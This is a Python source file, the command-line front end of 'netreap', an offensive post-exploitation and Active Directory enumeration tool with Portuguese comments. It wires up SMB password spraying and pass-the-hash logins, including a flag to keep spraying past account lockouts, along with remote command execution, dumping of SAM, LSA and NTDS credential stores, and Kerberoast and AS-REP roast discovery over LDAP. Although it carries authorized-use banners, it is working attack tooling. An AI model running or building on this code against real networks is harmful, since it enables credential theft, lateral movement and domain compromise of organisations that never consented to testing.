"""netreap — interface de linha de comando.

Uso autorizado apenas: engajamentos com escopo, labs e CTF.
"""

from __future__ import annotations

import argparse
import os
import sys

from netreap import __version__
from netreap.creds import Credential
from netreap.output import Output
from netreap.runner import run_hosts
from netreap.targets import expand_targets
from netreap.protocols import smb as smbmod
from netreap.protocols import ldap as ldapmod

# codigos NT relevantes para autenticacao
_STATUS = {
    0xC000006D: "logon_failure",
    0xC000006E: "account_restriction",
    0xC0000071: "password_expired",
    0xC0000072: "account_disabled",
    0xC0000224: "password_must_change",
    0xC0000234: "account_locked_out",
}

BANNER = r"""
  _ __   ___| |_ _ __ ___  __ _ _ __
 | '_ \ / _ \ __| '__/ _ \/ _` | '_ \    netreap v%s
 | | | |  __/ |_| | |  __/ (_| | |_) |   post-ex / AD enum (uso autorizado)
 |_| |_|\___|\__|_|  \___|\__,_| .__/
                               |_|
""" % __version__


def _expand_wordish(values: list[str] | None) -> list[str]:
    """Expande itens que podem ser arquivos (um valor por linha)."""
    out: list[str] = []
    for v in values or []:
        if os.path.isfile(v):
            with open(v, encoding="utf-8") as fh:
                out += [ln.strip() for ln in fh
                        if ln.strip() and not ln.startswith("#")]
        else:
            out.append(v)
    return out


def _status_name(exc) -> str:
    code = getattr(exc, "getErrorCode", lambda: None)()
    return _STATUS.get(code, "logon_failure")


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="netreap",
        description="Enumeracao e post-exploitation de rede (uso autorizado).")
    p.add_argument("protocol", choices=["smb", "ldap"])
    p.add_argument("targets", nargs="+",
                   help="IP/CIDR/faixa/host ou @arquivo")

    a = p.add_argument_group("autenticacao")
    a.add_argument("-u", "--username", action="append", default=[],
                   help="usuario ou arquivo (repetivel)")
    a.add_argument("-p", "--password", action="append", default=[],
                   help="senha ou arquivo (repetivel)")
    a.add_argument("-H", "--hash", action="append", default=[],
                   help="hash NTLM p/ pass-the-hash (repetivel)")
    a.add_argument("-d", "--domain", default=".", help="dominio")
    a.add_argument("--local-auth", action="store_true",
                   help="autenticacao local (dominio = '.')")

    c = p.add_argument_group("conexao")
    c.add_argument("-t", "--threads", type=int, default=20)
    c.add_argument("--timeout", type=int, default=5)
    c.add_argument("--port", type=int, default=0, help="porta (0 = padrao)")
    c.add_argument("-o", "--output", help="arquivo JSON-lines")
    c.add_argument("--no-color", action="store_true")
    c.add_argument("--continue-on-lockout", action="store_true",
                   help="nao parar o spray mesmo apos lockout (perigoso)")

    m = p.add_argument_group("modulos SMB")
    m.add_argument("--shares", action="store_true")
    m.add_argument("--users", action="store_true")
    m.add_argument("--sessions", action="store_true")
    m.add_argument("--pass-pol", action="store_true")
    m.add_argument("-x", "--exec", metavar="CMD", help="executa comando")
    m.add_argument("--sam", action="store_true", help="dump SAM")
    m.add_argument("--lsa", action="store_true", help="dump LSA")
    m.add_argument("--ntds", action="store_true", help="dump NTDS (DC)")

    l = p.add_argument_group("modulos LDAP")
    l.add_argument("--groups", action="store_true")
    l.add_argument("--kerberoast", action="store_true")
    l.add_argument("--asreproast", action="store_true")
    l.add_argument("--ad-domain", help="FQDN do dominio AD (ldap)")
    return p


def _secrets(args) -> list[tuple[str, str]]:
    passwords = _expand_wordish(args.password)
    hashes = _expand_wordish(args.hash)
    return [("pass", x) for x in passwords] + [("hash", x) for x in hashes]


def _build_cred(user: str, kind: str, value: str, domain: str) -> Credential:
    if kind == "hash":
        return Credential.make(user, ntlm=value, domain=domain)
    return Credential.make(user, password=value, domain=domain)


def _authenticate(host: str, port: int, users: list[str],
                  secrets: list[tuple[str, str]], domain: str, timeout: int,
                  name: str, out: Output, stop_on_lockout: bool
                  ) -> tuple[Credential | None, bool]:
    """Spray (user x secret). Retorna (credencial_valida, is_admin)."""
    for user in users:
        for kind, value in secrets:
            cred = _build_cred(user, kind, value, domain)
            try:
                conn = smbmod.connect(host, port, timeout)
                smbmod.login(conn, cred)
                admin = smbmod.admin_check(host, port, cred, timeout)
                tag = "  (Pwn3d!)" if admin else ""
                out.event("SMB", host, "good", f"{cred.label()}{tag}",
                          port, name, valid=True, admin=admin)
                return cred, admin
            except Exception as exc:
                status = _status_name(exc)
                out.event("SMB", host, "bad", f"{cred.label()} ({status})",
                          port, name, valid=False, status=status)
                if status == "account_locked_out" and stop_on_lockout:
                    out.event("SMB", host, "warn",
                              f"lockout detectado em {user}; pulando",
                              port, name)
                    break
    return None, False


def handle_smb(host: str, args, users, secrets, out: Output) -> None:
    port = args.port or smbmod.DEFAULT_PORT
    try:
        conn = smbmod.connect(host, port, args.timeout)
    except Exception:
        out.event("SMB", host, "bad", "sem resposta SMB", port)
        return
    try:
        conn.login("", "")  # tenta sessao nula (pode ser negada)
    except Exception:
        pass
    try:
        info = smbmod.host_info(conn)  # ja populado na negociacao
    except Exception:
        info = smbmod.HostInfo("", "", "", False, False, "?")

    name = info.hostname or host
    out.event("SMB", host, "info",
              f"{info.os} (domain:{info.domain}) "
              f"(signing:{info.signing}) ({info.dialect})",
              port, name, os=info.os, domain=info.domain,
              signing=info.signing, dialect=info.dialect)

    if not users or not secrets:
        return

    cred, _admin = _authenticate(host, port, users, secrets, args.domain,
                                 args.timeout, name, out,
                                 stop_on_lockout=not args.continue_on_lockout)
    if not cred:
        return

    # modulos pos-autenticacao
    if args.shares:
        try:
            conn = smbmod.connect(host, port, args.timeout)
            smbmod.login(conn, cred)
            for sh in smbmod.list_shares(conn, cred):
                out.event("SMB", host, "info",
                          f"share {sh['name']:<15} [{sh['access']}] {sh['remark']}",
                          port, name, share=sh)
        except Exception as exc:
            out.event("SMB", host, "bad", f"shares: {exc}", port, name)

    if args.users:
        try:
            for u in smbmod.enum_users(host, port, cred, args.timeout):
                out.event("SMB", host, "info", f"user {u['domain']}\\{u['name']}",
                          port, name, user=u)
        except Exception as exc:
            out.event("SMB", host, "bad", f"users: {exc}", port, name)

    if args.sessions:
        try:
            for s in smbmod.enum_sessions(host, port, cred, args.timeout):
                out.event("SMB", host, "info",
                          f"session {s['user']} from {s['origin']}",
                          port, name, session=s)
        except Exception as exc:
            out.event("SMB", host, "bad", f"sessions: {exc}", port, name)

    if args.pass_pol:
        try:
            pol = smbmod.password_policy(host, port, cred, args.timeout)
            out.event("SMB", host, "info",
                      f"pass-pol min={pol['min_length']} "
                      f"history={pol['history']} complexity={pol['complexity']}",
                      port, name, pass_pol=pol)
        except Exception as exc:
            out.event("SMB", host, "bad", f"pass-pol: {exc}", port, name)

    if args.exec:
        try:
            output = smbmod.exec_command(host, port, cred, args.exec,
                                         args.timeout)
            for line in output.splitlines():
                out.event("SMB", host, "good", line, port, name)
        except Exception as exc:
            out.event("SMB", host, "bad", f"exec: {exc}", port, name)

    if args.sam or args.lsa or args.ntds:
        try:
            secrets_out = smbmod.dump_secrets(
                host, port, cred, args.timeout,
                do_sam=args.sam, do_lsa=args.lsa, do_ntds=args.ntds)
            for s in secrets_out:
                out.event("SMB", host, "good", s, port, name, secret=s)
        except Exception as exc:
            out.event("SMB", host, "bad", f"secretsdump: {exc}", port, name)


def handle_ldap(host: str, args, users, secrets, out: Output) -> None:
    ad_domain = args.ad_domain or (args.domain if args.domain != "." else None)
    if not ad_domain:
        out.event("LDAP", host, "bad",
                  "informe --ad-domain (FQDN) para LDAP", 389)
        return
    if not users or not secrets:
        out.event("LDAP", host, "bad", "LDAP exige credencial (-u/-p|-H)", 389)
        return

    user = users[0]
    kind, value = secrets[0]
    cred = _build_cred(user, kind, value, ad_domain)
    try:
        conn, base = ldapmod.connect(host, ad_domain, cred, args.timeout)
    except Exception as exc:
        out.event("LDAP", host, "bad", f"login falhou: {exc}", 389)
        return
    out.event("LDAP", host, "good", f"{cred.label()} em {ad_domain}", 389,
              ad_domain)

    try:
        if args.users:
            for u in ldapmod.enum_users(conn, base):
                out.event("LDAP", host, "info",
                          f"user {u.get('sAMAccountName','?')}", 389,
                          ad_domain, user=u)
        if args.groups:
            for g in ldapmod.enum_groups(conn, base):
                out.event("LDAP", host, "info",
                          f"group {g.get('sAMAccountName','?')}", 389,
                          ad_domain, group=g)
        if args.kerberoast:
            for u in ldapmod.kerberoastable(conn, base):
                out.event("LDAP", host, "good",
                          f"kerberoastable {u.get('sAMAccountName','?')}",
                          389, ad_domain, kerberoastable=u)
        if args.asreproast:
            for u in ldapmod.asreproastable(conn, base):
                out.event("LDAP", host, "good",
                          f"asrep-roastable {u.get('sAMAccountName','?')}",
                          389, ad_domain, asreproastable=u)
    except Exception as exc:
        out.event("LDAP", host, "bad", f"enum: {exc}", 389, ad_domain)


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    if args.local_auth:
        args.domain = "."

    sys.stderr.write(BANNER + "\n")
    sys.stderr.write("  [!] use apenas contra sistemas que voce esta "
                     "autorizado a testar\n\n")

    hosts = expand_targets(args.targets)
    if not hosts:
        sys.stderr.write("nenhum alvo valido\n")
        return 1

    users = _expand_wordish(args.username)
    secrets = _secrets(args)
    out = Output(json_path=args.output, no_color=args.no_color)

    handler = handle_smb if args.protocol == "smb" else handle_ldap
    run_hosts(hosts, lambda h: handler(h, args, users, secrets, out),
              threads=args.threads)

    out.close()
    return 0
